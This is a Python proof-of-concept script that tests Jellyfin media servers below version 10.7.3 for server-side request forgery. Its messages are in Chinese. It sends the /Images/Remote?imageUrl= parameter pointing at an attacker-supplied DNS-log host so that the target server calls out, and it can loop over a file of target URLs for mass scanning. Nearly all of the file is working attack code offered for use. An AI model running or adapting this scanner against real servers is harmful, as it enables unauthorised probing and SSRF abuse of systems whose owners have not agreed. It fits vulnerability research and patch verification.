#!/usr/bin/env python
# -*- conding:utf-8 -*-
import requests
import argparse
import sys
import urllib3
urllib3.disable_warnings()


def title():
    print("""
     _         _   _           __   _            ___   ___   ___   ___ 
  _ | |  ___  | | | |  _  _   / _| (_)  _ _     / __| / __| | _ \ | __|
 | || | / -_) | | | | | || | |  _| | | | ' \    \__ \ \__ \ |   / | _| 
  \__/  \___| |_| |_|  \_, | |_|   |_| |_||_|   |___/ |___/ |_|_\ |_|  
                       |__/                                           

                                     Author: Henry4E36
               """)

class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file
        self.dnslog = args.dnslog

    def target_url(self):
        dnslog = self.dnslog
        target_url = self.url + "/Images/Remote?imageUrl=http://{0}".format(dnslog)
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        }

        # proxies = {
        #     "http": "http://127.0.0.1:8080",
        #
        # }
        # 获取Jellyfin 版本和 系统OS类型(类型要不要不影响）
        info_url = self.url + "/system/info/public"
        try:
            info_res = requests.get(url=info_url, headers=headers, verify=False, timeout=5)
            if info_res.status_code == 200 and "Version" in info_res.text:
                if info_res.json()['Version'] < "10.7.3":
                    try:
                        # 验证SSRF
                        res = requests.get(url=target_url, headers=headers, verify=False, timeout=20)
                        if res.status_code == 500 and "Error processing request." in res.text:
                            print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 存在SSRF,请查看DnsLog回显确认漏洞\033[0m")
                            print("[" + "-" * 100 + "]")
                        else:
                            print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在SSRF！")
                            print("[" + "-" * 100 + "]")
                    except Exception as e:
                        print("[\033[31mX\033[0m]  连接错误！大概率是 timeout 的问题")
                        print("[" + "-" * 100 + "]")
                else:
                    print(f"[\033[31mx\033[0m]  目标系统: {self.url} 版本过高！")
                    print("[" + "-" * 100 + "]")
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！")
            print("[" + "-"*100 + "]")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)





if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='Jellyfin SSRF')
    parser.add_argument("-d", "--dnslog", type=str, metavar="dnslog", help="Dnslog eg:\"y9c0ii.dnslog.cn\"")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 5 or args.dnslog is None:
        print(
            "[-]  参数错误！\neg1:>>>python3 Jellyfin-ssrf..py -u http://127.0.0.1 -d y9c0ii.dnslog.cn"
            "\neg2:>>>python3 Jellyfin-ssrf..py -f ip.txt -d y9c0ii.dnslog.cn")
    elif args.url:
        information(args).target_url()

    elif args.file:
        information(args).file_url()

